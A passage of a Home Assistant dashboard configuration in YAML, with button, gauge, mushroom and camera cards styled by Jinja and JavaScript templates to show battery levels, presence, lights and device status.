                --card-mod-icon-color: green;
              {% elif phlevel >= 7.6 and phlevel <= 7.79 %}
                --card-mod-icon-color: yellow;
              {% elif phlevel >= 7.80 %}
                --card-mod-icon: mdi:alert;
                --card-mod-icon-color: yellow;
                --primary-text-color: yellow;
              {% else %}
                --card-mod-icon: mdi:head-question;
                --card-mod-icon-color: grey;
                --card-mod-text-color: red;
                --primary-text-color: red;
                --secondary-text-color: blue;
              {% endif %}
            }
      - type: custom:frigate-card
        cameras:
          - camera_entity: camera.rtsp
        view:
          dark_mode: 'on'
        menu:
          buttons:
            frigate:
              enabled: false
            live:
              enabled: false
            cameras:
              enabled: false
            camera_ui:
              enabled: true
            substreams:
              enabled: false
          style: none
        live:
          preload: true
          controls:
            builtin: false
        performance:
          features:
            animated_progress_indicator: false
      - type: custom:banner-card
        row_size: 3
        background: '#B0C2ED'
        heading:
          - mdi:shower
          - Bathroom
        color: red
        link: /lovelace/living_room
        entities:
          - entity: sensor.living_room_door_temperature
            name: Temp
      - type: custom:button-card
        show_name: true
        show_icon: true
        show_state: false
        entity: media_player.plex_plex_for_windows_desktop_p54jk04
        name: >-
          [[[ return
          states['media_player.plex_plex_for_windows_desktop_p54jk04'].state;
          ]]]
        icon: |
          [[[
             if (entity.state == ""playing"") return 'mdi:play';
             if (entity.state == ""paused"") return 'mdi:play-pause';
             else return 'mdi:stop';
          ]]]
      - type: custom:button-card
        entity: person.derek
        aspect_ratio: 1/1
        name: Person
        show_entity_picture: true
        show_name: false
        hold_action:
          action: none
        state:
          - value: home
            styles:
              custom_fields:
                icon:
                  - border-color: '#77c66e'
          - value: not_home
            styles:
              card:
                - background-color: '#dedede'
              custom_fields:
                icon:
                  - border-color: deepskyblue
        styles:
          card:
            - background-color: white
            - border-radius: 5%
            - padding: 5%
            - color: gray
            - font-size: 10px
            - text-shadow: 0px 0px 0px black
            - text-transform: capitalize
            - justify-self: end
            - align-self: middle
          grid:
            - grid-template-areas: '""icon status"" ""n n"" ""battery proximity"" ""wifi ss"" ""sd sd""'
            - grid-template-columns: 2fr 1fr
            - grid-template-rows: 1fr min-content min-content min-content min-content
          name:
            - font-size: 15px
            - align-self: middle
            - justify-self: start
            - padding-bottom: 10px
          custom_fields:
            icon:
              - clip-path: circle()
              - width: 80%
              - pointer-events: none
              - display: grid
              - border: 5px solid
              - border-color: gray
              - border-radius: 500px
              - margin: 0 +10% 0 0
              - justify-self: end
              - opacity: 1
            status:
              - align-self: start
              - justify-self: end
              - color: gray
            proximity:
              - padding: 0.5em 0px
              - align-self: middle
              - justify-self: start
              - color: gray
            wifi:
              - padding: 0.5em 0px
              - align-self: middle
              - justify-self: start
              - color: gray
              - '--text-wifi-color-sensor': >-
                  [[[ if (states[""person.derek""].attributes.wifi_on == 'false')
                  return ""#aaaaaa""; ]]]
            battery:
              - padding: 0.5em 0px
              - align-self: middle
              - justify-self: start
              - color: gray
              - '--text-color-sensor': >-
                  [[[ if (states[""person.derek""].attributes.battery_level < 50)
                  return ""#EF4F1A""; ]]]
        custom_fields:
          icon: >
            [[[ return entity === undefined ? null : `<img
            src=""https://frazhome.zapto.org/local/alex.png"" width=""100%"">`; ]]]
          status: |
            [[[
              if (states['person.derek'].state =='not_home') { 
              return `<ha-icon icon=""mdi:home-export-outline""
                style=""width: 20px; height: 20px; color: '#888888';"">
                </ha-icon><span> Away</span>`;
              } 
              if (states['person.derek'].state =='home') { 
              return `<ha-icon 
                icon=""mdi:home""
                style=""width: 20px; height: 20px; color: 888888;"">
                </ha-icon><span> ${entity.state}</span>`;
              } else {
              return `<ha-icon 
                icon=""mdi:map-marker-radius""
                style=""width: 20px; height: 20px; color: 888888;"">
                </ha-icon><span> ${entity.state}</span>`;
              }
            ]]]
          battery: |
            [[[
              if (states['person.derek'].attributes.battery_charging =='true') { 
                return `<ha-icon
                icon=""mdi:battery-charging""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['person.derek'].attributes.battery_level}% battery</span></span>`;
              } else {
                return `<ha-icon
                icon=""mdi:battery""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['person.derek'].attributes.battery_level}% battery</span></span>`;
              }
            ]]]
          wifi: |
            [[[
              if (states['person.derek'].attributes.wifi_on =='false') { 
                return `<ha-icon
                icon=""mdi:wifi""
                style=""width: 20px; height: 20px; color: var(--text-wifi-color-sensor);"">
                </ha-icon> <span><span style=""color: var(--text-wifi-color-sensor);"">Disconnected</span></span>`; 
              } else {
                return `<ha-icon
                icon=""mdi:wifi""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['person.derek'].attributes.wifi_on}</span></span>`;
              }
            ]]]
      - type: custom:button-card
        entity: person.derek
        aspect_ratio: 1/1
        name: Person
        show_entity_picture: true
        show_name: false
        hold_action:
          action: none
        state:
          - value: home
            styles:
              custom_fields:
                icon:
                  - border-color: '#77c66e'
          - value: not_home
            styles:
              card:
                - background-color: '#dedede'
              custom_fields:
                icon:
                  - border-color: '#EF4F1A'
          - value: Work
            styles:
              custom_fields:
                icon:
                  - border-color: deepskyblue
        styles:
          card:
            - background-color: transparent
            - border-radius: 5%
            - padding: 5%
            - color: gray
            - font-size: 10px
            - text-shadow: 0px 0px 0px black
            - text-transform: capitalize
            - justify-self: end
            - align-self: middle
            - width: 200px
            - height: 200px
          grid:
            - grid-template-areas: '""icon icon"" ""n n"" ""battery status"" ""s s"" ""wifi steps"" ""sd sd""'
            - grid-template-columns: 1fr 1fr
            - grid-template-rows: 1fr min-content min-content min-content min-content
          name:
            - font-size: 15px
            - align-self: middle
            - justify-self: start
            - padding-bottom: 10px
          custom_fields:
            icon:
              - clip-path: circle()
              - width: 60%
              - pointer-events: none
              - display: grid
              - border: 5px solid
              - border-color: gray
              - border-radius: 500px
              - margin: 0 15% 0 0
              - justify-self: end
              - opacity: 1
            status:
              - padding: 0.5em
              - align-self: middle
              - justify-self: right
              - color: gray
            steps:
              - padding: 0.5em
              - align-self: middle
              - justify-self: right
              - color: gray
            wifi:
              - padding: 0.5em 0px
              - align-self: middle
              - justify-self: start
              - color: gray
              - '--text-wifi-color-sensor': >-
                  [[[ if (states[""sensor.s22_ultra_wifi_connection""].state ==
                  '<not connected>') return ""#aaaaaa""; ]]]
            battery:
              - padding: 0.5em 0px
              - align-self: middle
              - justify-self: start
              - color: gray
              - '--text-color-sensor': >-
                  [[[ if (states[""sensor.s22_ultra_battery_level""].state < 50)
                  return ""#EF4F1A""; ]]]
        custom_fields:
          icon: >
            [[[ return entity === undefined ? null : `<img
            src=""${states[entity.entity_id].attributes.entity_picture}""
            width=""100%"">`; ]]]
          status: |
            [[[
              if (states['person.derek'].state =='not_home') { 
              return `<ha-icon icon=""mdi:home-export-outline""
                style=""width: 20px; height: 20px; color: '#888888';"">
                </ha-icon><span> Away</span>`;
              } 
              if (states['person.derek'].state =='home') { 
              return `<ha-icon 
                icon=""mdi:home""
                style=""width: 20px; height: 20px; color: 888888;"">
                </ha-icon><span> ${entity.state}</span>`;
              } else {
              return `<ha-icon 
                icon=""mdi:map-marker-radius""
                style=""width: 20px; height: 20px; color: 888888;"">
                </ha-icon><span> ${entity.state}</span>`;
              }
            ]]]
          steps: |
            [[[
              return `<ha-icon
                icon=""mdi:walk""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon>  <span>\<span style=""color: var(--text-color-sensor);"">${parseInt(states['sensor.watch5_daily_steps'].state)} steps</span></span>`
            ]]]
          battery: |
            [[[
              if (states['sensor.s22_ultra_battery_state'].state =='charging') { 
                return `<ha-icon
                icon=""mdi:battery-charging""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['sensor.s22_ultra_battery_level'].state}% battery</span></span>`;
              } else {
                return `<ha-icon
                icon=""mdi:battery""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['sensor.s22_ultra_battery_level'].state}% battery</span></span>`;
              }
            ]]]
          wifi: |
            [[[
              if (states['sensor.s22_ultra_wifi_connection'].state =='<not connected>') { 
                return `<ha-icon
                icon=""mdi:wifi""
                style=""width: 20px; height: 20px; color: var(--text-wifi-color-sensor);"">
                </ha-icon> <span><span style=""color: var(--text-wifi-color-sensor);"">Disconnected</span></span>`; 
              } else {
                return `<ha-icon
                icon=""mdi:wifi""
                style=""width: 20px; height: 20px; color: #888888;"">
                </ha-icon> <span><span style=""color: var(--text-color-sensor);"">${states['sensor.s22_ultra_wifi_connection'].state}</span></span>`;
              }
            ]]]
      - type: custom:button-card
        entity: sensor.s22_ultra_battery_level
        show_state: true
        variables:
          var_color: |-
            [[[ 
              var percentage = entity.state;
              var r = 0; var g = 0; var b = 0;
              if (percentage < 50 ) {
                var r = 255;
                var g = parseInt(5.1 * percentage);
              } else {   
                var g = 255;
                var r = parseInt(510 - 5.10 * percentage);
              }
              var h = r * 0x10000 + g * 0x100 + b * 0x1;
              return '#' + ('000000' + h.toString(16)).slice(-6);
            ]]]
        styles:
          icon:
            - color: '[[[ return variables.var_color ]]]'
          card:
            - height: 200px
            - width: 200px
      - type: grid
        cards:
          - type: gauge
            entity: sensor.s22_ultra_battery_level
            min: 0
            max: 100
            segments:
              - from: 0
                color: var(--gauge-gradient)
            needle: true
            card_mod:
              style: >
                :host { --gauge-gradient: url(""data:image/svg+xml,%3Csvg
                xmlns='http://www.w3.org/2000/svg' width='100'
                height='100'%3E%3Cdefs%3E%3ClinearGradient id='linear' x1='0%25'
                y1='0%25' x2='100%25' y2='0%25'%3E%3Cstop offset='0%25'
                stop-color='red'/%3E%3Cstop offset='50%25'
                stop-color='yellow'/%3E%3Cstop offset='100%25'
                stop-color='green'/%3E%3C/linearGradient%3E%3C/defs%3E%3C/svg%3E#linear"");
                }
          - type: gauge
            entity: sensor.s22_ultra_battery_level
            min: 0
            max: 100
            segments:
              - from: 0
                color: var(--gauge-gradient)
            needle: true
            card_mod:
              style: |
                :host { --gauge-gradient:   {% set percentage = 87 | int %}
                  {% set r, g, b = 0, 0, 0 %}
                  {% if (percentage <= 51) %}
                    {% set r = 255 %}
                    {% set g = (5.0 * percentage) | round | int %}
                  {% else %}
                    {% set g = 255 %}
                    {% set r = (505 - 4.89 * percentage) | round | int %}
                  {% endif %}
                  {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
          - type: gauge
            entity: sensor.s22_ultra_battery_level
            min: 0
            max: 100
            needle: true
            segments:
              - from: 0
                color: '#57bb8a'
              - from: 5
                color: '#63b682'
              - from: 10
                color: '#73b87e'
              - from: 15
                color: '#84bb7b'
              - from: 20
                color: '#94bd77'
              - from: 25
                color: '#a4c073'
              - from: 30
                color: '#b0be6e'
              - from: 35
                color: '#c4c56d'
              - from: 40
                color: '#d4c86a'
              - from: 45
                color: '#e2c965'
              - from: 50
                color: '#f5ce62'
              - from: 55
                color: '#f3c563'
              - from: 60
                color: '#e9b861'
              - from: 65
                color: '#e6ad61'
              - from: 70
                color: '#ecac67'
              - from: 75
                color: '#e9a268'
              - from: 80
                color: '#e79a69'
              - from: 85
                color: '#e5926b'
              - from: 90
                color: '#e2886c'
              - from: 90
                color: '#e0816d'
              - from: 100
                color: '#dd776e'
          - type: gauge
            entity: sensor.s22_ultra_battery_level
            name: Red-to-green
            min: 0
            max: 100
            needle: true
            segments:
              - from: 0
                color: '#FF0000'
              - from: 3
                color: '#FF1100'
              - from: 7
                color: '#FF2200'
              - from: 10
                color: '#FF3300'
              - from: 13
                color: '#FF4400'
              - from: 17
                color: '#FF5500'
              - from: 20
                color: '#FF6600'
              - from: 23
                color: '#FF7700'
              - from: 27
                color: '#FF8800'
              - from: 30
                color: '#FF9900'
              - from: 33
                color: '#FFAA00'
              - from: 37
                color: '#FFBB00'
              - from: 40
                color: '#FFCC00'
              - from: 43
                color: '#FFDD00'
              - from: 47
                color: '#FFEE00'
              - from: 50
                color: '#FFFF00'
              - from: 53
                color: '#EEFF00'
              - from: 57
                color: '#DDFF00'
              - from: 60
                color: '#CCFF00'
              - from: 63
                color: '#BBFF00'
              - from: 67
                color: '#AAFF00'
              - from: 70
                color: '#99FF00'
              - from: 73
                color: '#88FF00'
              - from: 77
                color: '#77FF00'
              - from: 80
                color: '#66FF00'
              - from: 83
                color: '#55FF00'
              - from: 87
                color: '#44FF00'
              - from: 90
                color: '#33FF00'
              - from: 93
                color: '#22FF00'
              - from: 97
                color: '#11FF00'
              - from: 100
                color: '#00FF00'
          - type: gauge
            entity: sensor.s22_ultra_battery_level
            name: Green-to-red
            min: 0
            max: 100
            needle: true
            segments:
              - from: 0
                color: '#00FF00'
              - from: 3
                color: '#11FF00'
              - from: 7
                color: '#22FF00'
              - from: 10
                color: '#33FF00'
              - from: 13
                color: '#44FF00'
              - from: 17
                color: '#55FF00'
              - from: 20
                color: '#66FF00'
              - from: 23
                color: '#77FF00'
              - from: 27
                color: '#88FF00'
              - from: 30
                color: '#99FF00'
              - from: 33
                color: '#AAFF00'
              - from: 37
                color: '#BBFF00'
              - from: 40
                color: '#CCFF00'
              - from: 43
                color: '#DDFF00'
              - from: 47
                color: '#EEFF00'
              - from: 50
                color: '#FFFF00'
              - from: 53
                color: '#FFEE00'
              - from: 57
                color: '#FFDD00'
              - from: 60
                color: '#FFCC00'
              - from: 63
                color: '#FFBB00'
              - from: 67
                color: '#FFAA00'
              - from: 70
                color: '#FF9900'
              - from: 73
                color: '#FF8800'
              - from: 77
                color: '#FF7700'
              - from: 80
                color: '#FF6600'
              - from: 83
                color: '#FF5500'
              - from: 87
                color: '#FF4400'
              - from: 90
                color: '#FF3300'
              - from: 93
                color: '#FF2200'
              - from: 97
                color: '#FF1100'
              - from: 100
                color: '#FF0000'
      - type: custom:button-card
        entity: light.office1
        name: Office
        icon: mdi:wall-sconce-flat
        styles:
          card:
            - height: 100px
          icon:
            - width: 25%
          name:
            - padding: 5px 0px
            - font-size: 15px
            - text-overflow: unset
            - white-space: unset
            - word-break: break-word
        state:
          - value: 'on'
            color: yellow
          - value: 'off'
            styles:
              icon:
                - opacity: 0.5
      - type: entities
        entities:
          - entity: light.living_room1
            type: custom:multiple-entity-row
            name: One entity
            secondary_info: last-changed
            entities:
              - sensor.bedroom_max_temp
            icon: >
              [[[ return `<ha-icon icon=""mdi:circle-small"" style=""width: 25px;
              height:25px;""> </ha-icon>`; ]]]
          - entity: light.hallway
            name: Entity card using one state
            type: custom:multiple-entity-row
            secondary_info: last-changed
            toggle: true
            card_mod:
              style: |-
                :host {
                  {% if is_state('light.hallway', 'off') %}
                    --card-mod-icon: mdi:light-switch-off;
                    --card-mod-icon-color: red;
                  {% else %}
                    --card-mod-icon: mdi:light-switch;
                    --card-mod-icon-color: green;
                  {% endif %}
                }
      - type: custom:button-card
        entity: light.bedroom1
        template:
          - onstate
          - offstate
  - path: mushroom
    icon: mdi:mushroom
    theme: Derek Dark Theme
    badges: []
    cards:
      - type: vertical-stack
        title: Mushroom light card with brightness control
        cards:
          - type: custom:mushroom-light-card
            entity: light.living_room_lights
            fill_container: false
            use_light_color: true
            show_brightness_control: true
            show_color_control: false
            show_color_temp_control: false
            collapsible_controls: true
            layout: horizontal
            card_mod:
              style: |
                mushroom-chips-card {
                 --ha-card-background: transparent;}
      - type: custom:mushroom-chips-card
        chips:
          - type: entity
            entity: person.derek
          - type: entity
            entity: sensor.s22_ultra_battery_level
            use_entity_picture: false
          - type: entity
            entity: input_boolean.guest_mode
            double_tap_action:
              action: more-info
            name: Guest
            use_entity_picture: false
            content_info: name
            icon_color: green
            tap_action:
              action: toggle
        card_mod:
          style: |
            ha-card {
              {% if states('input_boolean.guest_mode') == 'on' %}
                --card-mod-icon-color: green;
              {% elif states('input_boolean.guest_mode') == 'off' %}
                --card-mod-icon-color: red;
              {% endif %}
            }
      - type: custom:mushroom-chips-card
        chips:
          - type: entity
            entity: person.derek
          - type: template
            content: |-
              {% if states.light | selectattr('state', 'eq', 'on')
                | map(attribute='entity_id') | map('area_name')
                | select('in', ['Living Room'])
                | list | count  == 0 %}
               {0}
              {%else %}
              {{states.light | selectattr('state', 'eq', 'on')
                | map(attribute='entity_id') | map('area_name')
                | select('in', ['Living Room'])
                | list | count}}
              {%- endif %}
            icon: mdi:lightbulb
            icon_color: |-
              {% if (states.light | selectattr('state', 'eq', 'on')
                    | map(attribute='entity_id') | map('area_name')
                    | select('in', ['Living Room'])
                    | list | count) >= 1 -%}
              yellow
              {%- else -%}
              white
              {%- endif %}
            hold_action:
              action: call-service
              service: light.turn_off
              service_data: {}
              target:
                area_id: living_room
          - type: template
            entity: input_boolean.guest_mode
            content: Guest Mode
            icon: mdi:home
            icon_color: |
              {{ (states(entity)==""on"") | iif(""green"", ""red"") }}
            press_action:
              action: toggle
      - type: vertical-stack
        title: Icon based on charging state (chip)
        cards:
          - type: custom:mushroom-chips-card
            chips:
              - type: template
                entity: sensor.fire_computer_desk_battery_level
                content: '{{ states(''sensor.fire_computer_desk_battery_level'') }} %'
                icon: >
                  {{
                  (states(""binary_sensor.fire_computer_desk_plugged_in"")==""off"")
                  | iif(""mdi:tablet-dashboard"", ""mdi:flash"") }}
                icon_color: >-
                  {{ is_state('binary_sensor.fire_computer_desk_plugged_in',
                  'on') | iif('yellow', 'gray') }}
      - type: vertical-stack
        title: Icon based on charging state (mushroom)
        cards:
          - type: custom:mushroom-template-card
            entity: sensor.fire_computer_desk_battery_level
            primary: '{{ states(""sensor.fire_computer_desk_battery_level"") }} %'
            icon: >-
              {{ is_state('binary_sensor.fire_computer_desk_plugged_in', 'on') |
              iif('mdi:battery', 'mdi:power-plug') }}
            icon_color: >-
              {{ is_state('binary_sensor.fire_computer_desk_plugged_in', 'on')
              |  iif('red',  'green') }}
      - type: custom:mushroom-template-card
        primary: Hello, {{user}}
        secondary: How are you?
        icon: mdi:home
        card_mod:
          style: |
            :host { 
              --mush-icon-size: 50px;
            }
            ha-card { 
              --card-primary-font-size:  15px;
              --card-secondary-font-size: 10px;
            } 
            mushroom-shape-icon {
              --shape-color: none !important;
              --shape-color-disabled: none !important;
            }
      - type: vertical-stack
        title: Mushroom template card with colors based on battery level
        cards:
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: S22
            secondary: >-
              {{ states(entity) }} {{ state_attr(entity, ""unit_of_measurement"")
              }}
            icon: |
              {% set state = (states(entity) | int) %}
              {% if state >= 75 %} mdi:battery-90
              {% elif state >= 33 %} mdi:battery-40
              {% else %} mdi:battery-10
              {% endif %}
            icon_color: |
              {% set state = (states(entity) | int) %}
              {% if state >= 90 %} green
              {% elif state >= 70 %} light-green
              {% elif state >= 50 %} orange
              {% elif state >= 30 %} yellow
              {% else %} red
              {% endif %}
            tap_action:
              action: none
            hold_action:
              action: none
            double_tap_action:
              action: none
      - type: vertical-stack
        title: Swipe card (auto scrolling)
        cards:
          - type: custom:swipe-card
            parameters:
              autoHeight: false
              initialSlide: 1
              centeredSlides: true
              effect: cards
              loop: false
              followfinger: true
              autoplay:
                delay: 3000
            cards:
              - type: custom:mushroom-chips-card
                chips:
                  - type: action
                    tap_action:
                      action: navigate
                      navigation_path: /lovelace/WoonKamer
                    icon: mdi:sofa
                    icon_color: deep-purple
                    style: |
                      ha-card {
                       --chip-height: 50px;
                      }
                  - type: action
                    icon: mdi:door-closed
                    tap_action:
                      action: navigate
                      navigation_path: /lovelace/gang
                    icon_color: brown
                    style: |
                      ha-card {
                       --chip-height: 50px;
                      }
                  - type: action
                    icon: mdi:cctv
                    icon_color: white
                    tap_action:
                      action: navigate
                      navigation_path: /lovelace/Camera
                    style: |
                      ha-card {
                       --chip-height: 50px;
                      }
              - type: custom:mushroom-chips-card
                chips:
                  - type: entity
                    entity: person.derek
                    use_entity_picture: true
                    card_mod:
                      style: |
                        ha-card {
                          border: unset;
                          --chip-background: none
                          --chip-font-size: 0.4em;
                          --chip-padding: 0 0.3em;
                          --chip-box-shadow: none;
                  - type: entity
                    entity: sensor.s22_ultra_battery_level
                    use_entity_picture: false
                  - type: template
                    entity: input_boolean.guest_mode
                    content: Guest Mode
                    icon: >
                      {{ (states(entity)==""on"") | iif(""mdi:home"",
                      ""mdi:home-off-outline"") }}
                    icon_color: |
                      {{ (states(entity)==""on"") | iif(""green"", ""red"") }}
                    press_action:
                      action: toggle
                  - type: template
                    entity: input_boolean.automation_override
                    content: Automations
                    icon: >
                      {{ (states(entity)==""off"") | iif(""mdi:lightbulb-auto"",
                      ""mdi:lightbulb-auto-outline"") }}
                    icon_color: |
                      {{ (states(entity)==""off"") | iif(""green"", ""red"") }}
                    press_action:
                      action: toggle
                    hold_action:
                      action: navigate
                      navigation_path: /fire-main/automations
                  - type: template
                    entity: input_boolean.automation_interior_motion_detectors
                    content: Motion Detectors
                    icon: >
                      {{ (states(entity)==""on"") | iif(""mdi:motion-sensor"",
                      ""mdi:motion-sensor-off"") }}
                    icon_color: |
                      {{ (states((entity))==""on"") | iif(""green"", ""red"") }}
                    press_action:
                      action: toggle
                  - type: conditional
                    conditions:
                      - entity: binary_sensor.living_room_motion_detector_on_off
                        state: 'on'
                    chip:
                      type: template
                      icon_color: red
                      icon: mdi:motion-sensor
                      card_mod:
                        style: |
                          ha-card { 
                          animation: blink 1s linear infinite; 
                          --chip-icon-size: 0.6em; 
                          }
                      hold_action:
                        action: navigate
                        navigation_path: /fire-main/sensors
              - type: custom:mushroom-template-card
                primary: S22
                secondary: >-
                  {{ states(entity) }} {{ state_attr(entity,
                  ""unit_of_measurement"") }}
                icon: |
                  {% set state = (states(entity) | int) %}
                  {% if state >= 75 %} mdi:battery-90
                  {% elif state >= 33 %} mdi:battery-40
                  {% else %} mdi:battery-10
                  {% endif %}
                entity: sensor.s22_ultra_battery_level
                icon_color: |
                  {% set state = (states(entity) | int) %}
                  {% set state = (80) %}
                  {% if state >= 90 %} green
                  {% elif state >= 70 %} lime
                  {% elif state >= 40 %} orange
                  {% elif state >= 30 %} yellow
                  {% else %} red
                  {% endif %}
                tap_action:
                  action: none
                hold_action:
                  action: none
                double_tap_action:
                  action: none
      - type: vertical-stack
        title: Mushroom chip icon/color based on power usage
        cards:
          - type: custom:mushroom-chips-card
            chips:
              - type: template
                content: >
                  {{ ((states(""sensor.tv_plug_active_power"") | int) > 5) |
                  iif(""TV is on"", ""TV is off"") }}
                icon: >
                  {{ ((states(""sensor.tv_plug_active_power"") | int) > 5) |
                  iif(""mdi:television"", ""mdi:television-off"") }}
                icon_color: >
                  {{ ((states(""sensor.tv_plug_active_power"") | int) > 5) |
                  iif('green', 'red') }}
              - type: template
                entity: sensor.tv_plug_active_power
                content: >
                  {{ ((states(entity) | int) > 5) | iif(""TV is on"", ""TV is off"")
                  }}
                icon: |
                  {{ ((states(entity) | int) > 5) | iif(""mdi:television"",
                  ""mdi:television-off"") }}
                icon_color: |
                  {{ ((states(entity) | int) > 5) | iif('green', 'red') }}
                tap_action:
                  action: none
                hold_action:
                  action: none
                double_tap_action:
                  action: none
      - type: vertical-stack
        title: Mushroom chip styling (card_mod)
        cards:
          - type: custom:mushroom-chips-card
            chips:
              - type: entity
                entity: person.derek
                use_entity_picture: true
                card_mod:
                  style: |
                    ha-card {
                      border: unset;
                      --chip-box-shadow: none;
                      --chip-background: none;
                      --chip-font-size: 24px;
                      --chip-padding: 0 0.3em;
                      --text-color: red;
                      --chip-height: 75px;
                      --chip-border-radius: 45px;
                    }
      - type: vertical-stack
        title: Mushroom template animation WIP
        cards:
          - type: custom:mushroom-template-card
            primary: Robot
            icon: mdi:robot-outline
            icon_color: deep-purple
            entity: input_boolean.tester
            card_mod:
              style:
                mushroom-shape-icon$: |
                  ha-icon {
                    --icon-animation: rotation 2s linear infinite
                  }
                  @keyframes rotation {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                  }
                  .shape {
                    --shape-animation: ping 2s infinite;
                  }
                  @keyframes ping {
                    60% { box-shadow: 0 0 0 0 rgba(var(--rgb-green), 0.7); }
                    100% { box-shadow: 0 0 5px 15px transparent; }
                  }
          - type: custom:mushroom-template-card
            primary: Robot
            icon: mdi:robot-outline
            icon_color: deep-purple
            entity: input_boolean.tester
            card_mod:
              style: |
                ha-card {
                  animation: rotation linear infinite;
                  {% if states('input_boolean.guest_mode') == 'on' %}
                    animation-duration: 3s;
                    icon_color: green;
                  {%- else -%}
                    color: inherit;
                  {%- endif %}
                  }
                @keyframes rotation {
                  0% { 
                    transform: rotate(0deg); 
                    }
                  100% { 
                    transform: rotate(360deg); 
                      }
                  }
          - type: custom:mushroom-template-card
            primary: Robot
            icon: mdi:robot-outline
            icon_color: deep-purple
            entity: input_boolean.tester
            card_mod:
              style: |
                ha-state-icon {
                  animation: rotation linear infinite 3s;
                }
                @keyframes rotation {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg);}
                }
          - type: custom:mushroom-template-card
            primary: Robot
            icon: mdi:robot-outline
            icon_color: deep-purple
            entity: input_boolean.tester
            card_mod:
              style: |
                ha-state-icon {
                  animation: rotation 3s linear infinite;
                  }
                @keyframes rotation {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
                }
      - type: vertical-stack
        title: Mushroom multiline_secondary spacing
        cards:
          - type: custom:mushroom-template-card
            primary: Bedroom
            multiline_secondary: true
            secondary: >-
              {{ states('sensor.bedroom_temperature')|int }}°F       {{
              states('sensor.bedroom_humidity')|int }}%
      - type: vertical-stack
        title: Custom last updated info
        cards:
          - type: custom:mushroom-template-card
            primary: 'Travel time: {{ states(""sensor.waze_travel_time"") }} minutes'
            secondary: >-
              Last updated:    {% set t = ((as_timestamp(now()) -
              as_timestamp(states.sensor.waze_travel_time.last_updated)) | int)
              %}   {% if t <= 10 %} Just now  {% elif t <= 60 %} {{ t }}
              seconds  {% elif t < 3600 %}
                {{ (t / 60) | int }} min {{ (t % 60) }} sec 
              {% elif t >= 3600 %}
                {{ (t / 3600) | int }} hr {{ (t / 60) | int }} min {{ (t % 60) }} sec 
              {% else %} error  {% endif %}
          - type: custom:mushroom-template-card
            primary: 'Status: {{ states(""light.living_room_lights"") }}'
            secondary: >-
              {% set t = ((as_timestamp(now()) -
              as_timestamp(states.light.living_room_lights.last_changed)) | int)
              %}   

              {% if t < 60 %} 

              {% elif t < 3600 %} {{ (t / 60) | int }} min 

              {% elif t >= 3600 %} {{ (t / 3600) | int }} hr {{ (t / 60) | int
              }} min

              {% else %} error  

              {% endif %}
      - type: custom:mushroom-template-card
        entity: light.living_room1
        primary: 'Show attribute '
        secondary: '{{ state_attr(""light.living_room1"", ""brightness"") }}'
        icon: mdi:check
        icon_color: |-
          {% if states(""light.living_room1"") == ""on"" %}
            green
          {% else %}
            red
          {% endif %}
        tap_action:
          action: none
        hold_action:
          action: none
        double_tap_action:
          action: none
        badge_icon: mdi:home
        badge_color: green
        picture: ''
        card_mod:
          style: |
            ha-card { 
              --ha-card-background: rgb(5, 48, 104);   
              font-family: 'Comfortaa'; 
              filter: 
                drop-shadow(2.5px 2.5px 0.125rem rgb(48, 48, 51)); 
              }
      - type: custom:mushroom-template-card
        primary: Hello, {{ user }} !
        secondary: '{{ states(""sensor.time"") }}'
        fill_container: false
        multiline_secondary: false
        card_mod:
          style: |
            :host {
              --primary-text-color: red;
              --secondary-text-color: red;
              --ha-card-background: transparent;
              --ha-card-border-width: 0;
              text-align: center;
              --card-primary-font-size: 26px !important;
              --card-secondary-font-size: 18px !important;
              font-family: 'Comfortaa';
            }
      - type: vertical-stack
        cards:
          - type: custom:mushroom-template-card
            entity: person.derek
            primary: '{{ state_attr(entity, ""friendly_name"").upper() }}'
            secondary: '{{ states(entity).capitalize() }}'
            layout: vertical
            icon: mdi:check
            icon_color: |-
              {% if states(""person.derek"").lower() == ""home"" %}
                green
              {% else %}
                red
              {% endif %}
          - type: custom:mushroom-entity-card
            entity: person.derek
            primary: '{{ entity }}'
            secondary: '{{ states(entity) }}'
            layout: vertical
            icon: mdi:check
            card_mod:
              style: |
                :host {
                  --mush-icon-size: 60px;
                  --card-primary-font-size: 30px !important;
                  --card-secondary-font-size: 10px !important;
                  
                }
                mushroom-shape-icon {
                  --shape-color: red !important;
                  --shape-color-disabled: none !important;}
                }
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: '{{ state_attr(entity, ""friendly_name"").title() }}'
            secondary: '{{ states(entity) + ""%"" }}'
            layout: vertical
            icon: >
              {% set battery_level = states(entity) | int // 10 * 10 %}   

              {% set charging_state = states('sensor.s22_ultra_charger_type')
              %}   

              {% set is_charging =
              is_state('binary_sensor.s22_ultra_is_charging', 'on') | iif(True,
              False) %}  

              {% set map = {""none"":"""",
              ""ac"":""charging-"",""wireless"":""charging-wireless-""} %}  

              {% set charging = map[states('sensor.s22_ultra_charger_type')] %} 

              {% if battery_level == 100 and is_charging == True %}
              mdi:battery-charging   

              {% elif battery_level == 100 %} mdi:battery      

              {% elif battery_level >= 10 %}
              mdi:battery-{{charging}}{{battery_level}}    

              {% elif battery_level >= 0 %} mdi:battery-{{charging}}outline     

              {% else %} mdi:battery-unknown     

              {% endif %} 
            icon_color: |-
              {% set percentage = states(entity) | int %}
              {% set r, g, b = 0, 0, 0 %}
              {% if (percentage <= 51) %}
                {% set r = 255 %}
                {% set g = (5.0 * percentage) | round | int %}
              {% else %}
                {% set g = 255 %}
                {% set r = (505 - 4.89 * percentage) | round | int %}
              {% endif %}
              {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
      - type: custom:button-card
        show_entity_picture: true
        state:
          - value: 'on'
